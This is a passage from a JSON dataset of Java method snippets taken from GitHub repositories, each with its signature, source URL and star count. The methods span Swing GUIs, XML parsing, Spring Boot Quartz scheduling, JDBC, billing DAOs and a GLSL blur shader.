cityNode = new DefaultMutableTreeNode(city);\n\n        countryNode.add(regionNode);\n        regionNode.add(districtNode);\n        districtNode.add(cityNode);\n\n        return new JTree(countryNode).getModel();\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Rgr1/src/main/java/com/demkom58/rgr1/view/MainGui.java", "stars": "2", "class_props": {"extends": "JFrame", "implements": null, "modifiers": ["public"]}}, {"id": 56798, "method_name": "getSelectedNode", "class_name": "MainGui", "params": [], "throws": null, "modifiers": ["private"], "return_type": "DefaultMutableTreeNode", "snippet": "    private DefaultMutableTreeNode getSelectedNode() {\n        Object selectedNode = viewTree.getLastSelectedPathComponent();\n        if (selectedNode == null)\n            JOptionPane.showMessageDialog(viewTree, \"Select node at first!\", \"Error\", JOptionPane.ERROR_MESSAGE);\n\n        return (DefaultMutableTreeNode) selectedNode;\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Rgr1/src/main/java/com/demkom58/rgr1/view/MainGui.java", "stars": "2", "class_props": {"extends": "JFrame", "implements": null, "modifiers": ["public"]}}, {"id": 56799, "method_name": "expandAll", "class_name": "MainGui", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void expandAll() {\n        for (int i = 0; i < viewTree.getRowCount(); i++)\n            viewTree.expandRow(i);\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Rgr1/src/main/java/com/demkom58/rgr1/view/MainGui.java", "stars": "2", "class_props": {"extends": "JFrame", "implements": null, "modifiers": ["public"]}}, {"id": 56800, "method_name": "selectNode", "class_name": "MainGui", "params": ["DefaultMutableTreeNode"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void selectNode(DefaultMutableTreeNode node) {\n        int n = 0;\n\n        DefaultMutableTreeNode root = (DefaultMutableTreeNode) viewTree.getModel().getRoot();\n        Enumeration<TreeNode> enm = root.children();\n        while (enm.hasMoreElements()) {\n            final TreeNode treeNode = enm.nextElement();\n            if (treeNode == node) {\n                viewTree.setSelectionRow(n);\n                return;\n            }\n\n            n++;\n        }\n    }", "url": "https://raw.githubusercontent.com/pi-181/oop-labs/master/Rgr1/src/main/java/com/demkom58/rgr1/view/MainGui.java", "stars": "2", "class_props": {"extends": "JFrame", "implements": null, "modifiers": ["public"]}}, {"id": 56801, "method_name": "startElement", "class_name": "NetcastPOSTRequestParser", "params": ["String", "String", "String", "Attributes"], "throws": ["SAXException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {\n\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/netcast/NetcastPOSTRequestParser.java", "stars": "4", "class_props": {"extends": "DefaultHandler", "implements": null, "modifiers": ["public"]}}, {"id": 56802, "method_name": "endElement", "class_name": "NetcastPOSTRequestParser", "params": ["String", "String", "String"], "throws": ["SAXException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void endElement(String uri, String localName, String qName) throws SAXException {\n        try {\n            System.out.println(\"XML key: \" + qName + \", value: \" + value);\n            if (qName.equalsIgnoreCase(CHANNEL_TYPE)) {\n                object.put(\"channelModeName\", value);\n            }\n            else if (qName.equalsIgnoreCase(MAJOR)) {\n                object.put(\"majorNumber\", Integer.parseInt(value));\n            }\n            else if (qName.equalsIgnoreCase(DISPLAY_MAJOR)) {\n                object.put(\"displayMajorNumber\", Integer.parseInt(value));\n            }\n            else if (qName.equalsIgnoreCase(MINOR)) {\n                object.put(\"minorNumber\", Integer.parseInt(value));\n            }\n            else if (qName.equalsIgnoreCase(DISPLAY_MINOR)) {\n                object.put(\"displayMinorNumber\", Integer.parseInt(value));\n            }\n            else if (qName.equalsIgnoreCase(SOURCE_INDEX)) {\n                object.put(\"sourceIndex\", value);\n            }\n            else if (qName.equalsIgnoreCase(PHYSICAL_NUM)) {\n                object.put(\"physicalNumber\", Integer.parseInt(value));\n            }\n            else if (qName.equalsIgnoreCase(CHANNEL_NAME)) {\n                object.put(\"channelName\", value);\n            }\n            else if (qName.equalsIgnoreCase(PROGRAM_NAME)) {\n                object.put(\"programName\", value);\n            }\n            else if (qName.equalsIgnoreCase(AUDIO_CHANNEL)) {\n                object.put(\"audioCh\", value);\n            }\n            else if (qName.equalsIgnoreCase(INPUT_SOURCE_NAME)) {\n                object.put(\"inputSourceName\", value);\n            }\n            else if (qName.equalsIgnoreCase(INPUT_SOURCE_TYPE)) {\n                object.put(\"inputSourceType\", value);\n            }\n            else if (qName.equalsIgnoreCase(LABEL_NAME)) {\n                object.put(\"labelName\", value);\n            }\n            else if (qName.equalsIgnoreCase(INPUT_SOURCE_INDEX)) {\n                object.put(\"inputSourceIndex\", value);\n            }\n            else if (qName.equalsIgnoreCase(VALUE)) {\n                if (keyboardVisibleMode) {\n                    if (value.equalsIgnoreCase(\"true\"))\n                        subObject.put(\"focus\", true);\n                    else \n                        subObject.put(\"focus\", false);\n                    object.put(\"currentWidget\", subObject);\n                }\n                else {\n                    object.put(\"value\", value);\n                }\n            }\n            else if (qName.equalsIgnoreCase(MODE)) {\n                if (keyboardVisibleMode) {\n                    if (value.equalsIgnoreCase(\"default\"))\n                        subObject.put(\"hiddenText\", false);\n                    else \n                        subObject.put(\"hiddenText\", true);\n                    object.put(\"currentWidget\", subObject);\n                }\n            }\n            else if (qName.equalsIgnoreCase(STATE)) { \n\n            }\n            else if (value != null && value.equalsIgnoreCase(\"KeyboardVisible\")) {\n                keyboardVisibleMode = true;\n\n                try {\n                    subObject.put(\"contentType\", \"normal\");\n                    subObject.put(\"focus\", false);\n                    subObject.put(\"hiddenText\", false);\n                    subObject.put(\"predictionEnabled\", false);\n                    subObject.put(\"correctionEnabled\", false);\n                    subObject.put(\"autoCapitalization\", false);\n                } catch (JSONException e) {\n                    e.printStackTrace();\n                }\n            }\n            else if (value != null && value.equalsIgnoreCase(\"TextEdited\")) {\n                textEditMode = true;\n            }\n            value = null;\n        } catch (JSONException e) {\n            e.printStackTrace();\n        }\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/netcast/NetcastPOSTRequestParser.java", "stars": "4", "class_props": {"extends": "DefaultHandler", "implements": null, "modifiers": ["public"]}}, {"id": 56803, "method_name": "characters", "class_name": "NetcastPOSTRequestParser", "params": ["char", "int", "int"], "throws": ["SAXException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void characters(char[] ch, int start, int length) throws SAXException {\n        value = new String(ch, start, length);\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/netcast/NetcastPOSTRequestParser.java", "stars": "4", "class_props": {"extends": "DefaultHandler", "implements": null, "modifiers": ["public"]}}, {"id": 56804, "method_name": "getJSONObject", "class_name": "NetcastPOSTRequestParser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "JSONObject", "snippet": "    public JSONObject getJSONObject() {\n        return object;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/connectsdk/core/src/com/connectsdk/service/netcast/NetcastPOSTRequestParser.java", "stars": "4", "class_props": {"extends": "DefaultHandler", "implements": null, "modifiers": ["public"]}}, {"id": 56805, "method_name": "createURLStreamHandler", "class_name": "ContentURLStreamHandlerFactory", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "URLStreamHandler", "snippet": "    public URLStreamHandler createURLStreamHandler(String protocol) {\n        if (ContentResolver.SCHEME_CONTENT.equals(protocol)\n                || ContentResolver.SCHEME_FILE.equals(protocol)\n                || ContentResolver.SCHEME_ANDROID_RESOURCE.equals(protocol)) {\n            return new ContentURLStreamHandler(mResolver);\n        } else {\n            return null;\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/imageloader/ContentURLStreamHandlerFactory.java", "stars": "74", "class_props": {"extends": null, "implements": ["URLStreamHandlerFactory"], "modifiers": ["public"]}}, {"id": 56806, "method_name": "main", "class_name": "SampleQuartzApplication", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(SampleQuartzApplication.class, args);\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-quartz/src/main/java/smoketest/quartz/SampleQuartzApplication.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56807, "method_name": "sampleJobDetail", "class_name": "SampleQuartzApplication", "params": [], "throws": null, "modifiers": ["public"], "return_type": "JobDetail", "snippet": "\tpublic JobDetail sampleJobDetail() {\n\t\treturn JobBuilder.newJob(SampleJob.class).withIdentity(\"sampleJob\").usingJobData(\"name\", \"World\").storeDurably()\n\t\t\t\t.build();\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-quartz/src/main/java/smoketest/quartz/SampleQuartzApplication.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56808, "method_name": "sampleJobTrigger", "class_name": "SampleQuartzApplication", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Trigger", "snippet": "\tpublic Trigger sampleJobTrigger() {\n\t\tSimpleScheduleBuilder scheduleBuilder = SimpleScheduleBuilder.simpleSchedule().withIntervalInSeconds(2)\n\t\t\t\t.repeatForever();\n\n\t\treturn TriggerBuilder.newTrigger().forJob(sampleJobDetail()).withIdentity(\"sampleTrigger\")\n\t\t\t\t.withSchedule(scheduleBuilder).build();\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-quartz/src/main/java/smoketest/quartz/SampleQuartzApplication.java", "stars": "47572", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56809, "method_name": "main", "class_name": "JdbcDemo2", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n\n        Statement stmt = null;\n        Connection conn = null;\n        try {\n            //1\u3001\u6ce8\u518c\u9a71\u52a8\n            Class.forName(\"com.mysql.cj.jdbc.Driver\");\n            //2\u3001\u5b9a\u4e49 sql\n            String sql = \"insert into student values(null,'mary',1)\";\n            //3\u3001\u83b7\u53d6 Connection \u5bf9\u8c61\n            conn = DriverManager.getConnection(\"jdbc:mysql:///db1\", \"root\", \"\");\n            //4\u3001\u83b7\u53d6\u6267\u884c sql \u5bf9\u8c61 Statement\n            stmt = conn.createStatement();\n            //5\u3001\u6267\u884c sql\n            int count = stmt.executeUpdate(sql);\n\n            System.out.println(count);\n            if(count > 0){\n                System.out.println(\"\u6dfb\u52a0\u6210\u529f!\");\n            }else{\n                System.out.println(\"\u6dfb\u52a0\u5931\u8d25!\");\n            }\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (SQLException throwables) {\n            throwables.printStackTrace();\n        } finally {\n            if(stmt != null){\n                try {\n                    stmt.close();\n                } catch (SQLException throwables) {\n                    throwables.printStackTrace();\n                }\n            }\n\n            if(conn != null){\n                try {\n                    conn.close();\n                } catch (SQLException throwables) {\n                    throwables.printStackTrace();\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/chengcheng1021/javaStudy/master/src/jdbc/Demo/JdbcDemo2.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56810, "method_name": "getFreeCards", "class_name": "CerberCryptDAO", "params": [], "throws": ["BGException"], "modifiers": ["public"], "return_type": "List<Long>", "snippet": "    public List<Long> getFreeCards() throws BGException {\n        /*WSCardActions service = getWebService(WSCardActions_Service.class, WSCardActions.class, moduleId);\n        try {\n            List<Long> cardNumbers = service.getFreeCardNumbers();\n            return cardNumbers;\n        } catch (BGException_Exception e) {\n            processWebServiceException(e);\n        }\n        return null;*/\n        throw new UnsupportedOperationException();\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/CerberCryptDAO.java", "stars": "12", "class_props": {"extends": "BillingModuleDAO", "implements": null, "modifiers": ["public"]}}, {"id": 56811, "method_name": "getUserCardList", "class_name": "CerberCryptDAO", "params": ["int", "boolean"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "List<UserCard>", "snippet": "    public List<UserCard> getUserCardList(int contractId, boolean includeSlaveCards) throws BGException {\n        if (dbInfo.versionCompare(\"6.2\") >= 0) {\n            RequestJsonRpc req = new RequestJsonRpc(CERBERCRYPT_MODULE, moduleId, \"UserCardService\", \"getUserCardList\");\n            req.setParam(\"cid\", contractId);\n            req.setParam(\"slavecardsIncluding\", includeSlaveCards);\n\n            return readJsonValue(transferData.postDataReturn(req, user).traverse(),\n                    jsonTypeFactory.constructCollectionType(List.class, UserCard.class));\n        } \n        // TODO: \u0423\u0431\u0440\u0430\u0442\u044c \u043f\u043e\u0437\u0436\u0435 \u0432\u043c\u0435\u0441\u0442\u0435 \u0441\u043e \u0441\u0433\u0435\u043d\u0435\u0440\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u043c\u0438 \u043a\u043b\u0430\u0441\u0441\u0430\u043c\u0438 \u0441\u0435\u0440\u0432\u0438\u0441\u043e\u0432.\n        else if (dbInfo.versionCompare(\"5.1\") == 0) {\n            List<UserCard> result = new ArrayList<UserCard>();\n\n            WSUserCard service = getWebService(WSUserCard_Service.class, WSUserCard.class, moduleId);\n            try {\n                for (ru.bgcrm.plugin.bgbilling.ws.cerbercrypt.usercard.UserCard wsCard : service\n                        .getUserCardList(contractId, includeSlaveCards)) {\n                    UserCard card = new UserCard();\n                    card.setId(wsCard.getId());\n                    card.setNumber(wsCard.getNumber());\n                    card.setDateFrom(TimeUtils.parse(wsCard.getDate1(), TimeUtils.PATTERN_YYYYMMDD));\n                    card.setDateTo(TimeUtils.parse(wsCard.getDate2(), TimeUtils.PATTERN_YYYYMMDD));\n                    card.setComment(wsCard.getComment());\n                    card.setBaseCardTitle(wsCard.getBasecardTitle());\n\n                    result.add(card);\n                }\n            } catch (Exception e) {\n                processWebServiceException(e);\n            }\n\n            return result;\n        } else {\n            List<UserCard> usetCards = new ArrayList<UserCard>();\n\n            Request request = new Request();\n            request.setModule(CERBERCRYPT_MODULE_ID);\n            request.setAction(\"UserCardTable\");\n            request.setModuleID(String.valueOf(moduleId));\n            request.setContractId(contractId);\n\n            Document document = transferData.postData(request, user);\n            Element dataElement = document.getDocumentElement();\n            NodeList nodeList = dataElement.getElementsByTagName(\"row\");\n\n            for (int index = 0; index < nodeList.getLength(); index++) {\n                UserCard card = new UserCard();\n                Element rowElement = (Element) nodeList.item(index);\n                card.setId(Utils.parseInt(rowElement.getAttribute(\"id\")));\n                card.setComment(rowElement.getAttribute(\"comment\"));\n                card.setNumber(Utils.parseLong(rowElement.getAttribute(\"number\")));\n                TimeUtils.parsePeriod(rowElement.getAttribute(\"period\"), card);\n                card.setSubscrDate(\n                        TimeUtils.parse(rowElement.getAttribute(\"subscr_dt\"), TimeUtils.PATTERN_DDMMYYYY));\n                usetCards.add(card);\n            }\n\n            return usetCards;\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/CerberCryptDAO.java", "stars": "12", "class_props": {"extends": "BillingModuleDAO", "implements": null, "modifiers": ["public"]}}, {"id": 56812, "method_name": "getCardPackets", "class_name": "CerberCryptDAO", "params": ["int", "int", "Date"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "List<CardPacket>", "snippet": "    public List<CardPacket> getCardPackets(int contractId, int cardId, Date date) throws BGException {\n        if (dbInfo.versionCompare(\"6.2\") >= 0) {\n            RequestJsonRpc req = new RequestJsonRpc(CERBERCRYPT_MODULE, moduleId, \"CardPacketService\", \"cardPacketTable\");\n            req.setParam(\"cid\", contractId);\n            req.setParam(\"usercardId\", cardId);\n            req.setParam(\"date\", date);\n            req.setParam(\"objectId\", 0);\n            req.setParam(\"cinema\", false);\n\n            return readJsonValue(transferData.postDataReturn(req, user).traverse(),\n                    jsonTypeFactory.constructCollectionType(List.class, CardPacket.class));\n        } else {\n            List<CardPacket> cardPackets = new ArrayList<CardPacket>();\n    \n            Request request = new Request();\n            request.setModule(CERBERCRYPT_MODULE_ID);\n            request.setAction(\"CardPacketTable\");\n            request.setModuleID(String.valueOf(moduleId));\n            request.setContractId(contractId);\n            request.setAttribute(\"card\", cardId);\n            request.setAttribute(\"date\", new SimpleDateFormat(TimeUtils.PATTERN_DDMMYYYY).format(date));\n    \n            Document document = transferData.postData(request, user);\n            Element dataElement = document.getDocumentElement();\n            NodeList nodeList = dataElement.getElementsByTagName(\"row\");\n            if (nodeList.getLength() > 0) {\n                for (int index = 0; index < nodeList.getLength(); index++) {\n                    CardPacket cardPacket = new CardPacket();\n                    Element rowElement = (Element) nodeList.item(index);\n                    cardPacket.setId(Utils.parseInt(rowElement.getAttribute(\"id\")));\n                    cardPacket.setCard(Utils.parseInt(rowElement.getAttribute(\"card\")));\n                    cardPacket.setChangeDate(rowElement.getAttribute(\"change_date\"));\n                    cardPacket.setComment(rowElement.getAttribute(\"comment\"));\n                    cardPacket.setDateFrom(TimeUtils.parse(rowElement.getAttribute(\"date1\"), TimeUtils.PATTERN_DDMMYYYY));\n                    cardPacket.setDateTo(TimeUtils.parse(rowElement.getAttribute(\"date2\"), TimeUtils.PATTERN_DDMMYYYY));\n                    cardPacket.setPacket(rowElement.getAttribute(\"packet\"));\n                    cardPacket.setPeriod(rowElement.getAttribute(\"period\"));\n                    cardPacket.setStatus(rowElement.getAttribute(\"status\"));\n                    cardPacket.setPacketId(getPacketTypeId(cardPacket.getId()));\n    \n                    cardPackets.add(cardPacket);\n                }\n            }\n    \n            return cardPackets;\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/CerberCryptDAO.java", "stars": "12", "class_props": {"extends": "BillingModuleDAO", "implements": null, "modifiers": ["public"]}}, {"id": 56813, "method_name": "getCardPackets", "class_name": "CerberCryptDAO", "params": ["int", "int"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "List<CardPacket>", "snippet": "    public List<CardPacket> getCardPackets(int contractId, int cardId) throws BGException {\n        return getCardPackets(contractId, cardId, new Date());\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/CerberCryptDAO.java", "stars": "12", "class_props": {"extends": "BillingModuleDAO", "implements": null, "modifiers": ["public"]}}, {"id": 56814, "method_name": "getPacketTypeId", "class_name": "CerberCryptDAO", "params": ["int"], "throws": ["BGException"], "modifiers": ["private"], "return_type": "int", "snippet": "    private int getPacketTypeId(int packetId) throws BGException {\n        Request req = new Request();\n        req.setModule(CERBERCRYPT_MODULE_ID);\n        req.setAction(\"GetCardPacket\");\n        req.setModuleID(String.valueOf(moduleId));\n        req.setAttribute(\"id\", packetId);\n\n        Document document = transferData.postData(req, user);\n        Element dataElement = document.getDocumentElement();\n        NodeList nodeList = dataElement.getElementsByTagName(\"card_packet\");\n\n        if (nodeList.getLength() > 0) {\n            return Utils.parseInt(((Element) nodeList.item(0)).getAttribute(\"packet\"));\n        }\n\n        return -1;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/CerberCryptDAO.java", "stars": "12", "class_props": {"extends": "BillingModuleDAO", "implements": null, "modifiers": ["public"]}}, {"id": 56815, "method_name": "updateCardPacket", "class_name": "CerberCryptDAO", "params": ["int", "int", "int", "int", "String", "String"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateCardPacket(int contractId, int id, int cardNumebr, int packetId, String dateFrom, String dateTo)\n            throws BGException {\n        Request request = new Request();\n        request.setModule(CERBERCRYPT_MODULE_ID);\n        request.setAction(\"UpdateCardPacket\");\n        request.setModuleID(String.valueOf(moduleId));\n        request.setContractId(contractId);\n        request.setAttribute(\"card\", cardNumebr);\n        if (packetId > 0) {\n            request.setAttribute(\"packet\", packetId);\n        }\n        if (Utils.isEmptyString(dateFrom)) {\n            request.setAttribute(\"date1\", new SimpleDateFormat(\"dd.MM.yyyy\").format(new Date()));\n        }\n        if (Utils.notEmptyString(dateTo)) {\n            request.setAttribute(\"date2\", dateTo);\n        }\n        request.setAttribute(\"check\", 1);\n        request.setAttribute(\"id\", id);\n\n        Document doc = transferData.postData(request, user);\n        String errMsg = XMLUtils.selectText(doc, \"/data[@status='error']/text()\");\n        if (Utils.notEmptyString(errMsg)) {\n            throw new BGMessageException(errMsg);\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/CerberCryptDAO.java", "stars": "12", "class_props": {"extends": "BillingModuleDAO", "implements": null, "modifiers": ["public"]}}, {"id": 56816, "method_name": "getPacketList", "class_name": "CerberCryptDAO", "params": ["boolean"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "List<IdTitle>", "snippet": "    public List<IdTitle> getPacketList(boolean virtualCinema) throws BGException {\n        List<IdTitle> packets = new ArrayList<IdTitle>();\n\n        Request request = new Request();\n        request.setModule(CERBERCRYPT_MODULE_ID);\n        request.setAction(\"PacketList\");\n        request.setModuleID(String.valueOf(moduleId));\n        request.setAttribute(\"virtual_cinema\", virtualCinema);\n\n        Document document = transferData.postData(request, user);\n\n        for (Element e : XMLUtils.selectElements(document, \"/data/list/item\")) {\n            packets.add(new IdTitle(Utils.parseInt(e.getAttribute(\"id\")), e.getAttribute(\"title\")));\n        }\n\n        return packets;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/CerberCryptDAO.java", "stars": "12", "class_props": {"extends": "BillingModuleDAO", "implements": null, "modifiers": ["public"]}}, {"id": 56817, "method_name": "updateUserCard", "class_name": "CerberCryptDAO", "params": ["UserCard"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateUserCard(UserCard userCard) throws BGException {\n        try {\n            ru.bgcrm.plugin.bgbilling.ws.cerbercrypt.usercard.UserCard wsUserCard = new ru.bgcrm.plugin.bgbilling.ws.cerbercrypt.usercard.UserCard();\n            wsUserCard.setId(userCard.getId());\n            wsUserCard.setContractId(userCard.getContractId());\n            wsUserCard.setNumber(userCard.getNumber());\n            wsUserCard.setSubscrDate(userCard.getSubscrDate());\n            wsUserCard.setComment(userCard.getComment());\n            wsUserCard.setBasecardId(userCard.getBaseCardId());\n            wsUserCard.setUserdeviceId(0);\n            wsUserCard.setNeedSync(false);\n            wsUserCard.setDate1(TimeUtils.format(userCard.getDateFrom(), TimeUtils.PATTERN_YYYYMMDD));\n            wsUserCard.setDate2(TimeUtils.format(userCard.getDateTo(), TimeUtils.PATTERN_YYYYMMDD));\n\n            WSUserCard service = getWebService(WSUserCard_Service.class, WSUserCard.class, moduleId);\n            service.updateUserCard(wsUserCard);\n        } catch (Exception e) {\n            processWebServiceException(e);\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/CerberCryptDAO.java", "stars": "12", "class_props": {"extends": "BillingModuleDAO", "implements": null, "modifiers": ["public"]}}, {"id": 56818, "method_name": "dealerList", "class_name": "CerberCryptDAO", "params": ["Date", "Date", "String"], "throws": ["BGException"], "modifiers": ["public"], "return_type": "List<IdTitle>", "snippet": "    public List<IdTitle> dealerList(Date dateFrom, Date dateTo, String title) throws BGException {\n        List<IdTitle> dealerList = new ArrayList<IdTitle>();\n\n        Request request = new Request();\n        request.setAction(\"DealerTable\");\n        request.setModuleID(moduleId);\n        request.setModule(CERBERCRYPT_MODULE_ID);\n        request.setAttribute(\"date1\", dateFrom);\n        request.setAttribute(\"date2\", dateTo);\n        request.setAttribute(\"title\", Utils.maskNull(title, \"\"));\n\n        Document document = transferData.postData(request, user);\n\n        for (Element element : XMLUtils.selectElements(document, \"/data/table/data/row\")) {\n            dealerList.add(new IdTitle(Utils.parseInt(element.getAttribute(\"id\")), element.getAttribute(\"title\")));\n        }\n        return dealerList;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/plugin/bgbilling/proto/dao/CerberCryptDAO.java", "stars": "12", "class_props": {"extends": "BillingModuleDAO", "implements": null, "modifiers": ["public"]}}, {"id": 56819, "method_name": "main", "class_name": "ByteMagic", "params": ["String"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws Exception {\n        ClassPool pool = ClassPool.getDefault();\n        CtClass cc = pool.makeClass(\"TailMapFun\", pool.get(\"org.apache.flink.table.functions.ScalarFunction\"));\n        CtMethod m = CtNewMethod.make(\"public String eval(String name){return name+\\\"_tail\\\";}\", cc);\n        cc.addMethod(m);\n        cc.toClass().newInstance();\n        cc.writeFile();\n    }", "url": "https://raw.githubusercontent.com/jerryygit/zrDSL-flink/master/src/test/java/ByteMagic.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56820, "method_name": "getShader", "class_name": "SampleBlurEffect", "params": ["GLSurfaceView"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getShader(GLSurfaceView mGlSurfaceView) {\n        String s =\n                \"#extension GL_OES_EGL_image_external : require\\n\" +\n                        \"precision mediump float;\\n\" +\n                \"uniform samplerExternalOES sTexture;\\n\" +\n                \"varying vec2 vTextureCoord;\\n\" +\n                \"const float blurSize = \"+ blur + \"/800.0;\\n\" +\n                \"const float weightSum = 70.0 + 2.0 * (1.0 + 8.0 + 28.0 + 56.0);\\n\" +\n                \"\\n\" +\n                \"void main(void)\\n\" +\n                \"{\\n\" +\n                \"   vec4 sum = vec4(0.0);\\n\" +\n                \"\\n\" +\n                \"   sum += texture2D(sTexture, vec2(vTextureCoord.x - 4.0*blurSize, vTextureCoord.y)) * 1.0 / weightSum;\\n\" +\n                \"   sum += texture2D(sTexture, vec2(vTextureCoord.x - 3.0*blurSize, vTextureCoord.y)) * 8.0 / weightSum;\\n\" +\n                \"   sum += texture2D(sTexture, vec2(vTextureCoord.x - 2.0*blurSize, vTextureCoord.y)) * 28.0 / weightSum;\\n\" +\n                \"   sum += texture2D(sTexture, vec2(vTextureCoord.x - blurSize, vTextureCoord.y)) * 56.0 / weightSum;\\n\" +\n                \"   sum += texture2D(sTexture, vec2(vTextureCoord.x, vTextureCoord.y)) * 70.0 / weightSum;\\n\" +\n                \"   sum += texture2D(sTexture, vec2(vTextureCoord.x + blurSize, vTextureCoord.y)) * 56.0 / weightSum;\\n\" +\n                \"   sum += texture2D(sTexture, vec2(vTextureCoord.x + 2.0*blurSize, vTextureCoord.y)) * 28.0 / weightSum;\\n\" +\n                \"   sum += texture2D(sTexture, vec2(vTextureCoord.x + 3.0*blurSize, vTextureCoord.y)) * 8.0 / weightSum;\\n\" +\n                \"   sum += texture2D(sTexture, vec2(vTextureCoord.x + 4.0*blurSize, vTextureCoord.y)) * 1.0 / weightSum;\\n\" +\n                \"\\n\" +\n                \"   gl_FragColor = sum;\\n\" +\n                \"}\";\n        return s;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/effect/SampleBlurEffect.java", "stars": "2", "class_props": {"extends": null, "implements": ["GSYVideoGLView"], "modifiers": ["public"]}}, {"id": 56821, "method_name": "isPrime", "class_name": "Solution", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean isPrime(int n) \n    {\n        for (int i = 2; i <= Math.sqrt(n); i++) \n        {\n            if (n % i == 0) \n            {\n                return false;\n            }\n        }\n        return true;\n    }", "url": "https://raw.githubusercontent.com/Chitturiarunkrishna/Hackerrank30DaysOfCode/master/Day%2025%20-%20Running%20Time%20and%20Complexity.java", "stars": "16", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56822, "method_name": "main", "class_name": "Solution", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) \n    {\n         Scanner in = new Scanner(System.in);\n        int T = in.nextInt();\n        for (int i = 0; i < T; i++) \n        {\n            int n = in.nextInt();\n            if (n >= 2 && isPrime(n))\n                System.out.println(\"Prime\");\n            else System.out.println(\"Not prime\");\n        }\n    }", "url": "https://raw.githubusercontent.com/Chitturiarunkrishna/Hackerrank30DaysOfCode/master/Day%2025%20-%20Running%20Time%20and%20Complexity.java", "stars": "16", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56823, "method_name": "getMap", "class_name": "RequestPresenter", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "Map<String,List>", "snippet": "    protected Map<String, List<String>> getMap() {\n        return null;\n    }", "url": "https://raw.githubusercontent.com/guozaizai/myHttpSdkDemo/master/app/src/main/java/myapp/com/xm/myapplication/Presenter/RequestPresenter.java", "stars": "9", "class_props": {"extends": "BasePresenter", "implements": ["IRequest"], "modifiers": ["public"]}}, {"id": 56824, "method_name": "load", "class_name": "RequestPresenter", "params": ["PwdLoginRequest"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void load(PwdLoginRequest pwdLoginRequest) {\n        model.getData(pwdLoginRequest,request(data -> getView().setData((LoginResult)data)));\n    }", "url": 